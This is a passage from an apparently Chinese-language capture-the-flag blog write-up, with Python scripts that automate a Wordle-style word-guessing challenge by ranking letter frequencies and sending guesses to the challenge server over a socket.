class="built_in">list</span>(dict_letter.items())  <span class="comment"># 得到列表: L=[(&#x27;a&#x27;, 1), (&#x27;c&#x27;, 3), (&#x27;b&#x27;, 2)]</span></span><br><span class="line">    L.sort(key=<span class="keyword">lambda</span> x: x[<span class="number">1</span>], reverse=<span class="literal">False</span>)  <span class="comment"># 按列表中，每一个元组的第二个元素从小到大排序。</span></span><br><span class="line">    <span class="keyword">return</span> L</span><br><span class="line">    <span class="comment"># x代表从L中遍历出的一个元组</span></span><br><span class="line">    <span class="comment"># 得到:  [(&#x27;a&#x27;, 1), (&#x27;b&#x27;, 2), (&#x27;c&#x27;, 3)]</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">data = <span class="built_in">open</span>(<span class="string">&#x27;./valid_words.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">data = data.read().split(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">tmp = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> tmp != <span class="string">&#x27;0&#x27;</span>:</span><br><span class="line">    tmp = <span class="built_in">input</span>(<span class="string">&quot;请输入搜索的单词:&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> tmp == <span class="string">&#x27;0&#x27;</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;程序已关闭&quot;</span>)</span><br><span class="line">    <span class="keyword">elif</span> <span class="string">&#x27;-&#x27;</span> <span class="keyword">in</span> tmp:  <span class="comment"># -o[3]</span></span><br><span class="line">        tmp = <span class="string">&#x27;&#x27;</span>.join(tmp.split(<span class="string">&#x27;-&#x27;</span>)).split(<span class="string">&quot;[&quot;</span>)</span><br><span class="line">        <span class="comment"># [&#x27;o&#x27;, &#x27;3]&#x27;]</span></span><br><span class="line">        del_word = tmp[<span class="number">0</span>]</span><br><span class="line">        site = <span class="built_in">int</span>(tmp[<span class="number">1</span>][<span class="number">0</span>])</span><br><span class="line">        <span class="comment"># print(del_word, len(del_word))</span></span><br><span class="line">        <span class="comment"># print(data)</span></span><br><span class="line">        data2 = []</span><br><span class="line">        <span class="keyword">for</span> word <span class="keyword">in</span> data:</span><br><span class="line">            <span class="keyword">if</span> word[site-<span class="number">1</span>] != del_word:</span><br><span class="line">                data2.append(word)</span><br><span class="line">        data = data2</span><br><span class="line">        <span class="comment"># print(data)</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> data:</span><br><span class="line">            <span class="built_in">print</span>(i)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;共有&#123;0&#125;个&quot;</span>.<span class="built_in">format</span>(<span class="built_in">len</span>(data)))</span><br><span class="line">    <span class="keyword">elif</span> <span class="string">&#x27;[&#x27;</span> <span class="keyword">in</span> tmp:  <span class="comment"># d[1]</span></span><br><span class="line">        tmp = tmp.split(<span class="string">&#x27;[&#x27;</span>)</span><br><span class="line">        word = tmp[<span class="number">0</span>]  <span class="comment"># d</span></span><br><span class="line">        <span class="built_in">print</span>(word)</span><br><span class="line">        <span class="built_in">print</span>(tmp)</span><br><span class="line">        site = tmp[<span class="number">1</span>][<span class="number">0</span>]  <span class="comment"># 1</span></span><br><span class="line">        data2 = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> data:</span><br><span class="line">            <span class="keyword">if</span> i[<span class="built_in">int</span>(site) - <span class="number">1</span>] == word:</span><br><span class="line">                data2.append(i)</span><br><span class="line">        data = data2</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> data:</span><br><span class="line">            <span class="built_in">print</span>(i)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;共有&#123;0&#125;个&quot;</span>.<span class="built_in">format</span>(<span class="built_in">len</span>(data)))</span><br><span class="line">    <span class="keyword">elif</span> tmp.isdigit():</span><br><span class="line">        <span class="comment"># 1 -&gt; 统计所有单词第一位的数据</span></span><br><span class="line">        site = <span class="built_in">int</span>(tmp)</span><br><span class="line">        dict_letter = &#123;&#125;</span><br><span class="line">        <span class="keyword">for</span> word <span class="keyword">in</span> data:</span><br><span class="line">            <span class="keyword">if</span> word[site -<span class="number">1</span>] <span class="keyword">in</span> dict_letter:</span><br><span class="line">                dict_letter[word[site -<span class="number">1</span>]] += <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dict_letter[word[site -<span class="number">1</span>]] = <span class="number">1</span></span><br><span class="line">        dict_letter.items()  <span class="comment"># 得到: dict_items([(&#x27;a&#x27;, 1), (&#x27;c&#x27;, 3), (&#x27;b&#x27;, 2)])</span></span><br><span class="line"></span><br><span class="line">        L = <span class="built_in">list</span>(dict_letter.items())  <span class="comment"># 得到列表: L=[(&#x27;a&#x27;, 1), (&#x27;c&#x27;, 3), (&#x27;b&#x27;, 2)]</span></span><br><span class="line">        L.sort(key=<span class="keyword">lambda</span> x: x[<span class="number">1</span>], reverse=<span class="literal">False</span>)  <span class="comment"># 按列表中，每一个元组的第二个元素从小到大排序。</span></span><br><span class="line">        <span class="comment"># x代表从L中遍历出的一个元组</span></span><br><span class="line">        <span class="comment"># 得到:  [(&#x27;a&#x27;, 1), (&#x27;b&#x27;, 2), (&#x27;c&#x27;, 3)]</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> L:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;字母&#123;0&#125;         &#123;1&#125;次&quot;</span>.<span class="built_in">format</span>(i[<span class="number">0</span>], i[<span class="number">1</span>]))</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;已统计第 &#123;0&#125; 位字母的数据&quot;</span>.<span class="built_in">format</span>(site))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 用魔法来击败魔法</span></span><br><span class="line">    <span class="comment"># 统计，自动推荐！</span></span><br><span class="line">    <span class="comment"># L =  [(&#x27;a&#x27;, 1), (&#x27;b&#x27;, 2), (&#x27;c&#x27;, 3)]</span></span><br><span class="line">    <span class="keyword">elif</span> tmp == <span class="string">&quot;get&quot;</span>:</span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">get</span>():</span></span><br><span class="line">            L1 = sum_l(<span class="number">1</span>)</span><br><span class="line">            L2 = sum_l(<span class="number">2</span>)</span><br><span class="line">            L3 = sum_l(<span class="number">3</span>)</span><br><span class="line">            L4 = sum_l(<span class="number">4</span>)</span><br><span class="line">            L5 = sum_l(<span class="number">5</span>)</span><br><span class="line">            L_list = [L1, L2, L3, L4, L5]</span><br><span class="line">            quanzhong = &#123;&#125;</span><br><span class="line">            site = <span class="number">1</span></span><br><span class="line">            <span class="keyword">for</span> L <span class="keyword">in</span> L_list:</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">len</span>(L) == <span class="number">1</span>:  <span class="comment"># 此位已确定，不予排序</span></span><br><span class="line">                    <span class="keyword">pass</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    quanzhong[L[-<span class="number">1</span>][<span class="number">0</span>]+<span class="built_in">str</span>(site)] = L[-<span class="number">1</span>][-<span class="number">1</span>]  <span class="comment"># 把每一位最大权重的字母加到列表中like： &#123;&quot;c1&quot;: 3&#125; ；  &quot;1&quot; 指代第一位</span></span><br><span class="line">                site += <span class="number">1</span></span><br><span class="line">            Q = <span class="built_in">list</span>(quanzhong.items())</span><br><span class="line">            Q.sort(key=<span class="keyword">lambda</span> x: x[<span class="number">1</span>], reverse=<span class="literal">False</span>)  <span class="comment"># 按列表中，每一个元组的第二个元素从小到大排序。</span></span><br><span class="line">            <span class="comment"># 得到列表: Q=[(&#x27;a2&#x27;, 1), (&#x27;c3&#x27;, 4), (&#x27;b1&#x27;, 4)]</span></span><br><span class="line">            data3 = []</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 找data有最高权重字母的</span></span><br><span class="line">            site = <span class="built_in">int</span>(Q[-<span class="number">1</span>][<span class="number">0</span>][-<span class="number">1</span>])</span><br><span class="line">            letter = Q[-<span class="number">1</span>][<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line">            <span class="keyword">for</span> word <span class="keyword">in</span> data:</span><br><span class="line">                <span class="keyword">if</span> word[site-<span class="number">1</span>] == letter:</span><br><span class="line">                    data3.append(word)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(Q) &gt; <span class="number">1</span>:</span><br><span class="line">                <span class="comment"># 找data3有第二高权重字母的</span></span><br><span class="line">                site = <span class="built_in">int</span>(Q[-<span class="number">2</span>][<span class="number">0</span>][-<span class="number">1</span>])</span><br><span class="line">                letter = Q[-<span class="number">2</span>][<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line">                data4 = []</span><br><span class="line">                <span class="keyword">for</span> word <span class="keyword">in</span> data3:</span><br><span class="line">                    <span class="keyword">if</span> word[site-<span class="number">1</span>] == letter:</span><br><span class="line">                        data4.append(word)</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">len</span>(data4) == <span class="number">0</span>:  <span class="comment"># 没有满足的，返回第一权重的词群</span></span><br><span class="line">                    <span class="built_in">print</span>(data3)</span><br><span class="line">                <span class="keyword">elif</span> <span class="built_in">len</span>(Q) &gt; <span class="number">2</span>:  <span class="comment"># 找data4有第三高权重字母的</span></span><br><span class="line">                    site = <span class="built_in">int</span>(Q[-<span class="number">3</span>][<span class="number">0</span>][-<span class="number">1</span>])</span><br><span class="line">                    letter = Q[-<span class="number">3</span>][<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line">                    data5 = []</span><br><span class="line">                    <span class="keyword">for</span> word <span class="keyword">in</span> data4:</span><br><span class="line">                        <span class="keyword">if</span> word[site-<span class="number">1</span>] == letter:</span><br><span class="line">                            data5.append(word)</span><br><span class="line">                    <span class="keyword">if</span> <span class="built_in">len</span>(data5) == <span class="number">0</span>:   <span class="comment"># 没有满足的，返回第二权重的词群</span></span><br><span class="line">                        <span class="built_in">print</span>(data4)</span><br><span class="line">                    <span class="keyword">elif</span> <span class="built_in">len</span>(Q) &gt; <span class="number">3</span>:</span><br><span class="line">                        site = <span class="built_in">int</span>(Q[-<span class="number">4</span>][<span class="number">0</span>][-<span class="number">1</span>])</span><br><span class="line">                        letter = Q[-<span class="number">4</span>][<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line">                        data6 = []</span><br><span class="line">                        <span class="keyword">for</span> word <span class="keyword">in</span> data5:</span><br><span class="line">                            <span class="keyword">if</span> word[site - <span class="number">1</span>] == letter:</span><br><span class="line">                                data6.append(word)</span><br><span class="line">                        <span class="keyword">if</span> <span class="built_in">len</span>(data6) == <span class="number">0</span>:</span><br><span class="line">                            <span class="built_in">print</span>(data5)</span><br><span class="line">                        <span class="keyword">elif</span> <span class="built_in">len</span>(Q) &gt; <span class="number">4</span>:</span><br><span class="line">                            site = <span class="built_in">int</span>(Q[-<span class="number">5</span>][<span class="number">0</span>][-<span class="number">1</span>])</span><br><span class="line">                            letter = Q[-<span class="number">5</span>][<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line">                            data7 = []</span><br><span class="line">                            <span class="keyword">for</span> word <span class="keyword">in</span> data6:</span><br><span class="line">                                <span class="keyword">if</span> word[site - <span class="number">1</span>] == letter:</span><br><span class="line">                                    data7.append(word)</span><br><span class="line">                            <span class="keyword">if</span> <span class="built_in">len</span>(data7) == <span class="number">0</span>:</span><br><span class="line">                                <span class="built_in">print</span>(data6)</span><br><span class="line">                            <span class="keyword">else</span>:</span><br><span class="line">                                <span class="built_in">print</span>(data7)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(data3)  <span class="comment"># 就只有一个权重，返回之</span></span><br><span class="line">        get()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="comment"># 存在 s</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(data) == <span class="number">0</span>:</span><br><span class="line">            data = <span class="built_in">open</span>(<span class="string">&#x27;./valid_words.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">            data = data.read().split(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">        data1 = data</span><br><span class="line">        data = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> data1:</span><br><span class="line">            <span class="keyword">if</span> tmp <span class="keyword">in</span> i:</span><br><span class="line">                data.append(i)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> data:</span><br><span class="line">            <span class="built_in">print</span>(i)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;共有&#123;0&#125;个&quot;</span>.<span class="built_in">format</span>(<span class="built_in">len</span>(data)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># sabes  !!!</span></span><br></pre></td></tr></table></figure><p>🤔实话说，在我看错判定条件（以为完成个位数的关卡就可以得到flag）的情况下，一个色弱用其完成了八次（第九次手动取消了</p><p>回去审题，得知：</p><ul><li><p>模式选择</p><ul><li><p>模式 0</p><p>每一关可以猜9999次</p></li><li><p>模式 1</p><p>每一关可以猜6（7-1）次</p></li><li><p>模式 2</p><p>每一关可以猜5（7-2）次</p></li><li><p>模式 3</p><p>每一关可以猜4（7-3）次</p></li></ul></li><li><p>完成次数</p><ul><li>猜测次数用完后，自动结束，返回当前模式下当前次数所能获得的奖励</li><li>完成512次后，自动结束，并输出对应模式的奖励</li></ul></li></ul><p>很明显，正常人不能手动玩游戏玩出flag</p><p>但我当初写人工辅助脚本也是无奈之举，因为在模式选择里我向服务器发送“1”，死活没反应。</p><p>emo住了，过了三四个小时，实验了无数次后，发现该发送“1\n”</p><p><strong>绝！</strong></p><h3 id="失败"><a href="#失败" class="headerlink" title="失败"></a>失败</h3><p>在知道如何与靶机交互后，<strong>慌忙</strong>改了改原代码，开冲</p><p>慌忙的代价是，写的很差，调试、改了几小时，勉强能跑</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">import</span> socket</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 求出现总次数、排序</span></span><br><span class="line"><span class="attribute">def</span> sum_l(site):</span><br><span class="line">    <span class="attribute">global</span> data</span><br><span class="line">    <span class="attribute">dict_letter</span> = &#123;&#125;</span><br><span class="line">    <span class="attribute">for</span> word in data:</span><br><span class="line">        <span class="attribute">if</span> word[site - <span class="number">1</span>] in dict_letter:</span><br><span class="line">            <span class="attribute">dict_letter</span>[word[site - <span class="number">1</span>]] += <span class="number">1</span></span><br><span class="line">        <span class="attribute">else</span>:</span><br><span class="line">            <span class="attribute">dict_letter</span>[word[site - <span class="number">1</span>]] = <span class="number">1</span></span><br><span class="line">    <span class="attribute">dict_letter</span>.items()  # 得到: dict_items([(&#x27;a&#x27;, <span class="number">1</span>), (&#x27;c&#x27;, <span class="number">3</span>), (&#x27;b&#x27;, <span class="number">2</span>)])</span><br><span class="line">    <span class="attribute">L</span> = list(dict_letter.items())  # 得到列表: L=[(&#x27;a&#x27;, <span class="number">1</span>), (&#x27;c&#x27;, <span class="number">3</span>), (&#x27;b&#x27;, <span class="number">2</span>)]</span><br><span class="line">    <span class="attribute">L</span>.sort(key=lambda x: x[<span class="number">1</span>], reverse=False)  # 按列表中，每一个元组的第二个元素从小到大排序。</span><br><span class="line">    <span class="attribute">return</span> L</span><br><span class="line">    <span class="comment"># x代表从L中遍历出的一个元组</span></span><br><span class="line">    <span class="comment"># 得到:  [(&#x27;a&#x27;, 1), (&#x27;b&#x27;, 2), (&#x27;c&#x27;, 3)]</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 统计推荐</span></span><br><span class="line"><span class="attribute">def</span> get():</span><br><span class="line">    <span class="attribute">L1</span> = sum_l(<span class="number">1</span>)</span><br><span class="line">    <span class="attribute">L2</span> = sum_l(<span class="number">2</span>)</span><br><span class="line">    <span class="attribute">L3</span> = sum_l(<span class="number">3</span>)</span><br><span class="line">    <span class="attribute">L4</span> = sum_l(<span class="number">4</span>)</span><br><span class="line">    <span class="attribute">L5</span> = sum_l(<span class="number">5</span>)</span><br><span class="line">    <span class="attribute">L_list</span> =<span class="meta"> [L1, L2, L3, L4, L5]</span></span><br><span class="line">    <span class="attribute">quanzhong</span> = &#123;&#125;</span><br><span class="line">    <span class="attribute">site1</span> = <span class="number">1</span></span><br><span class="line">    <span class="attribute">for</span> L in L_list:</span><br><span class="line">        <span class="attribute">if</span> len(L) == <span class="number">1</span>:  # 此位已确定，不予排序</span><br><span class="line">            <span class="attribute">pass</span></span><br><span class="line">        <span class="attribute">else</span>:</span><br><span class="line">            <span class="attribute">quanzhong</span>[L[-<span class="number">1</span>][<span class="number">0</span>] + str(site<span class="number">1</span>)] = L[-<span class="number">1</span>][-<span class="number">1</span>]  # 把每一位最大权重的字母加到列表中like： &#123;<span class="string">&quot;c1&quot;</span>: <span class="number">3</span>&#125; ；  <span class="string">&quot;1&quot;</span> 指代第一位</span><br><span class="line">        <span class="attribute">site1</span> += <span class="number">1</span></span><br><span class="line">    <span class="attribute">Q</span> = list(quanzhong.items())</span><br><span class="line">    <span class="attribute">Q</span>.sort(key=lambda x: x[<span class="number">1</span>], reverse=False)  # 按列表中，每一个元组的第二个元素从小到大排序。</span><br><span class="line">    <span class="comment"># 得到列表: Q=[(&#x27;a2&#x27;, 1), (&#x27;c3&#x27;, 4), (&#x27;b1&#x27;, 4)]</span></span><br><span class="line">    <span class="attribute">data3</span> =<span class="meta"> []</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 找data有最高权重字母的</span></span><br><span class="line">    <span class="attribute">print</span>(Q)</span><br><span class="line">    <span class="attribute">site0</span> = int(Q[-<span class="number">1</span>][<span class="number">0</span>][-<span class="number">1</span>])</span><br><span class="line">    <span class="attribute">letter</span> = Q[-<span class="number">1</span>][<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line">    <span class="attribute">for</span> X in data:</span><br><span class="line">        <span class="attribute">if</span> X[site<span class="number">0</span> - <span class="number">1</span>] == letter:</span><br><span class="line">            <span class="attribute">data3</span>.append(X)</span><br><span class="line"></span><br><span class="line">    <span class="attribute">if</span> len(Q) == <span class="number">1</span>:</span><br><span class="line">        <span class="attribute">return</span> data<span class="number">3</span></span><br><span class="line">    <span class="attribute">elif</span> len(Q) &gt; <span class="number">1</span>:</span><br><span class="line">        <span class="comment"># 找data3中有第二高权重字母的</span></span><br><span class="line">        <span class="attribute">site0</span> = int(Q[-<span class="number">2</span>][<span class="number">0</span>][-<span class="number">1</span>])</span><br><span class="line">        <span class="attribute">letter</span> = Q[-<span class="number">2</span>][<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line">        <span class="attribute">data4</span> =<span class="meta"> []</span></span><br><span class="line">        <span class="attribute">for</span> word<span class="number">1</span> in data<span class="number">3</span>:</span><br><span class="line">            <span class="attribute">if</span> word<span class="number">1</span>[site<span class="number">0</span> - <span class="number">1</span>] == letter:</span><br><span class="line">                <span class="attribute">data4</span>.append(word<span class="number">1</span>)</span><br><span class="line">        <span class="attribute">if</span> len(data<span class="number">4</span>) == <span class="number">0</span>:  # 没有满足的，返回第一权重的词群</span><br><span class="line">            <span class="attribute">return</span> data<span class="number">3</span></span><br><span class="line">        <span class="attribute">elif</span> len(Q) == <span class="number">2</span>:</span><br><span class="line">            <span class="attribute">return</span> data<span class="number">4</span></span><br><span class="line">        <span class="attribute">elif</span> len(Q) &gt; <span class="number">2</span>:  # 找data<span class="number">4</span>有第三高权重字母的</span><br><span class="line">            <span class="attribute">site0</span> = int(Q[-<span class="number">3</span>][<span class="number">0</span>][-<span class="number">1</span>])</span><br><span class="line">            <span class="attribute">letter</span> = Q[-<span class="number">3</span>][<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line">            <span class="attribute">data5</span> =<span class="meta"> []</span></span><br><span class="line">            <span class="attribute">for</span> word<span class="number">2</span> in data<span class="number">4</span>:</span><br><span class="line">                <span class="attribute">if</span> word<span class="number">2</span>[site<span class="number">0</span> - <span class="number">1</span>] == letter:</span><br><span class="line">                    <span class="attribute">data5</span>.append(word<span class="number">2</span>)</span><br><span class="line">            <span class="attribute">if</span> len(data<span class="number">5</span>) == <span class="number">0</span>:  # 没有满足的，返回第二权重的词群</span><br><span class="line">                <span class="attribute">return</span> data<span class="number">4</span></span><br><span class="line">            <span class="attribute">elif</span> len(Q) == <span class="number">3</span>:</span><br><span class="line">                <span class="attribute">return</span> data<span class="number">5</span></span><br><span class="line">            <span class="attribute">elif</span> len(Q) &gt; <span class="number">3</span>:</span><br><span class="line">                <span class="attribute">site0</span> = int(Q[-<span class="number">4</span>][<span class="number">0</span>][-<span class="number">1</span>])</span><br><span class="line">                <span class="attribute">letter</span> = Q[-<span class="number">4</span>][<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line">                <span class="attribute">data6</span> =<span class="meta"> []</span></span><br><span class="line">                <span class="attribute">for</span> word<span class="number">3</span> in data<span class="number">5</span>:</span><br><span class="line">                    <span class="attribute">if</span> word<span class="number">3</span>[site<span class="number">0</span> - <span class="number">1</span>] == letter:</span><br><span class="line">                        <span class="attribute">data6</span>.append(word<span class="number">3</span>)</span><br><span class="line">                <span class="attribute">if</span> len(data<span class="number">6</span>) == <span class="number">0</span>:</span><br><span class="line">                    <span class="attribute">return</span> data<span class="number">5</span></span><br><span class="line">                <span class="attribute">elif</span> len(Q) == <span class="number">4</span>:</span><br><span class="line">                    <span class="attribute">return</span> data<span class="number">6</span></span><br><span class="line">                <span class="attribute">elif</span> len(Q) &gt; <span class="number">4</span>:</span><br><span class="line">                    <span class="attribute">site0</span> = int(Q[-<span class="number">5</span>][<span class="number">0</span>][-<span class="number">1</span>])</span><br><span class="line">                    <span class="attribute">letter</span> = Q[-<span class="number">5</span>][<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line">                    <span class="attribute">data7</span> =<span class="meta"> []</span></span><br><span class="line">                    <span class="attribute">for</span> word<span class="number">4</span> in data<span class="number">6</span>:</span><br><span class="line">                        <span class="attribute">if</span> word<span class="number">4</span>[site<span class="number">0</span> - <span class="number">1</span>] == letter:</span><br><span class="line">                            <span class="attribute">data7</span>.append(word<span class="number">4</span>)</span><br><span class="line">                    <span class="attribute">if</span> len(data<span class="number">7</span>) == <span class="number">0</span>:</span><br><span class="line">                        <span class="attribute">return</span> data<span class="number">6</span></span><br><span class="line">                    <span class="attribute">else</span>:</span><br><span class="line">                        <span class="attribute">return</span> data<span class="number">7</span></span><br><span class="line">    <span class="attribute">else</span>:</span><br><span class="line">        <span class="attribute">return</span> data<span class="number">3</span>  # 就只有一个权重，返回之</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="attribute">HOST</span> = &#x27;<span class="number">47.106.102.129</span>&#x27;</span><br><span class="line"><span class="attribute">PORT</span> = <span class="number">26389</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">s</span> = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"><span class="attribute">s</span>.connect((HOST, PORT))</span><br><span class="line"><span class="attribute">print</span>(s.recv(<span class="number">1024</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 选择模式</span></span><br><span class="line"><span class="attribute">s</span>.send(&#x27;<span class="number">1</span>\n&#x27;.encode())</span><br><span class="line"><span class="attribute">s_</span> = str(s.recv(<span class="number">1024</span>))</span><br><span class="line"><span class="attribute">print</span>(s_)</span><br><span class="line"><span class="attribute">for</span> each in range(<span class="number">515</span>):</span><br><span class="line">    <span class="attribute">state</span> = <span class="number">0</span></span><br><span class="line">    <span class="comment"># 初始化数据</span></span><br><span class="line">    <span class="attribute">data</span> = open(&#x27;/Users/wenhui/Downloads/daf<span class="number">733</span>a<span class="number">35279428</span>eac<span class="number">1</span>b<span class="number">7</span>fcc<span class="number">43328</span>fe<span class="number">8</span>/valid_words.txt&#x27;, &#x27;r&#x27;)</span><br><span class="line">    <span class="attribute">data</span> = data.read().split(&#x27;\n&#x27;)</span><br><span class="line">    <span class="attribute">while</span> state == <span class="number">0</span>:</span><br><span class="line">        <span class="comment"># 获取推荐并发送</span></span><br><span class="line">        <span class="attribute">GET</span> = get()</span><br><span class="line">        <span class="attribute">if</span> GET:</span><br><span class="line">            <span class="attribute">print</span>(GET)</span><br><span class="line">            <span class="attribute">tmp</span> = GET[-<span class="number">1</span>]</span><br><span class="line">        <span class="attribute">else</span>:</span><br><span class="line">            <span class="attribute">tmp</span> = data[-<span class="number">1</span>]</span><br><span class="line">            <span class="attribute">print</span>(<span class="string">&quot;get居然失效了！&quot;</span>)</span><br><span class="line">            <span class="attribute">print</span>(data)</span><br><span class="line">        <span class="attribute">s</span>.send(&#x27;&#123;<span class="number">0</span>&#125;\n&#x27;.format(tmp).encode())</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 接受反馈</span></span><br><span class="line">        <span class="attribute">s_</span> = str(s.recv(<span class="number">1024</span>))</span><br><span class="line">        <span class="attribute">print</span>(s_)</span><br><span class="line"></span><br><span class="line">        <span class="attribute">if</span> &#x27;Correct!&#x27; in s_:</span><br><span class="line">            <span class="attribute">state</span> = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 针对错误过程</span></span><br><span class="line">        <span class="attribute">s_</span> = &#x27;&#x27;.join(s_.split(<span class="string">&quot;b&#x27;Wrong!   &quot;</span>))</span><br><span class="line">        <span class="attribute">s_</span> = s_.split(r&#x27;  \x<span class="number">1</span>b[<span class="number">0</span>m&#x27;)</span><br><span class="line">        <span class="attribute">s_</span>.pop()</span><br><span 